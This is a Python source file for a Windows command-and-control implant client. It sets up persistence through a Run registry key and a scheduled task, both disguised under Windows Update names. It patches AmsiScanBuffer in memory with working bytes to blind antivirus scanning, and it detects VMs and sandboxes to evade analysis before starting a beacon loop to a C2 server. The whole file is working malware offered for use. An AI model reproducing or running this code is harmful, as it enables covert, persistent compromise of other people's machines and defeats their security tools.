#!/usr/bin/env python3
"""
Windows-native C2 Client wrapper.

Adds Windows-specific capabilities on top of the core client:
  - Persistence via Registry Run key or Scheduled Task
  - AMSI bypass attempt (in-memory patching)
  - Anti-analysis checks (VM / sandbox detection)
  - Runs the core beacon loop from client.py
"""

import ctypes
import os
import platform
import subprocess
import sys
import winreg

# Ensure the core client module is importable
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from client import run, DEFAULT_C2_SERVER, DEFAULT_BEACON_INTERVAL, DEFAULT_JITTER, DEFAULT_COMMUNICATION_CHANNEL


# ── Persistence ───────────────────────────────────────────────────────

def persist_registry(script_path: str | None = None) -> bool:
    """Add a Run key so the implant survives reboot."""
    try:
        path = script_path or os.path.abspath(__file__)
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE,
        )
        winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, f'pythonw.exe "{path}"')
        winreg.CloseKey(key)
        return True
    except Exception:
        return False


def persist_schtask(script_path: str | None = None) -> bool:
    """Create a scheduled task that runs at logon."""
    try:
        path = script_path or os.path.abspath(__file__)
        subprocess.run(
            [
                "schtasks", "/create", "/tn", "WindowsUpdateCheck",
                "/tr", f'pythonw.exe "{path}"',
                "/sc", "onlogon", "/rl", "highest", "/f",
            ],
            capture_output=True,
        )
        return True
    except Exception:
        return False


# ── AMSI bypass (educational) ────────────────────────────────────────

def patch_amsi() -> bool:
    """In-memory AMSI patch — sets AmsiScanBuffer to return E_INVALIDARG."""
    try:
        amsi = ctypes.windll.LoadLibrary("amsi.dll")
        addr = ctypes.windll.kernel32.GetProcAddress(
            ctypes.cast(amsi._handle, ctypes.c_void_p).value,
            b"AmsiScanBuffer",
        )
        if not addr:
            return False
        # 0xB8 0x57 0x00 0x07 0x80 = mov eax, 0x80070057 (E_INVALIDARG)
        # 0xC3                     = ret
        patch = b"\xB8\x57\x00\x07\x80\xC3"
        old_protect = ctypes.c_ulong(0)
        ctypes.windll.kernel32.VirtualProtect(
            ctypes.c_void_p(addr), len(patch),
            0x40,  # PAGE_EXECUTE_READWRITE
            ctypes.byref(old_protect),
        )
        ctypes.memmove(addr, patch, len(patch))
        ctypes.windll.kernel32.VirtualProtect(
            ctypes.c_void_p(addr), len(patch),
            old_protect.value,
            ctypes.byref(old_protect),
        )
        return True
    except Exception:
        return False


# ── Anti-analysis ─────────────────────────────────────────────────────

def is_sandbox() -> bool:
    """Basic VM / sandbox heuristics."""
    indicators = [
        os.path.exists(r"C:\windows\system32\drivers\vmmouse.sys"),
        os.path.exists(r"C:\windows\system32\drivers\vmhgfs.sys"),
        "vmware" in platform.platform().lower(),
        "virtual" in platform.platform().lower(),
        os.environ.get("USERNAME", "").lower() in ("sandbox", "malware", "virus", "analyst"),
    ]
    return any(indicators)


# ── Entry point ───────────────────────────────────────────────────────

def main() -> None:
    import argparse

    parser = argparse.ArgumentParser(description="C2 Windows Client")
    parser.add_argument("--server", "-s", default=DEFAULT_C2_SERVER)
    parser.add_argument("--interval", "-i", type=int, default=DEFAULT_BEACON_INTERVAL)
    parser.add_argument("--jitter", "-j", type=float, default=DEFAULT_JITTER)
    parser.add_argument("--persist", choices=["registry", "schtask", "none"], default="none")
    parser.add_argument("--amsi-bypass", action="store_true", default=False)
    parser.add_argument("--sandbox-check", action="store_true", default=False)
    args = parser.parse_args()

    if args.sandbox_check and is_sandbox():
        sys.exit(0)

    if args.amsi_bypass:
        patch_amsi()

    if args.persist == "registry":
        persist_registry()
    elif args.persist == "schtask":
        persist_schtask()

    run(args.server, args.interval, args.jitter)


if __name__ == "__main__":
    main()
